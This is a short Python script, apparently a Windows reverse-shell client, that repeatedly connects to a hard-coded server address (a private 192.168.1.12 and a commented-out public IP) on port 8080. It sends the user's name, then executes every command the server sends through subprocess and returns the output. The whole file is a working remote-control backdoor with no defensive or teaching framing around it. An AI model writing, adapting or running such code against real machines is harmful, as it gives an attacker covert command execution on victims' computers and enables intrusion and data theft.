import socket
import time
import subprocess

# Set up the server address and port
#server_address = '156.196.54.233'  # Replace with your server's IP address
server_address = '192.168.1.12'
server_port = 8080                # Replace with your server's port

username = subprocess.getoutput("""echo %username%""")

# Connect to the server


while True:
    # Create a socket object
    try:
        time.sleep(2)
        print("trying to connect")
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_address, server_port))
        time.sleep(1)
        client_socket.send(username.encode())
        print("send")

        # Receive commands from the server and execute them
        while True:
            try:
                command = client_socket.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                output = subprocess.getoutput(command)
                print(output)
                client_socket.send(output.encode())
            except:
                break
    except:
        print("sdf")
        pass


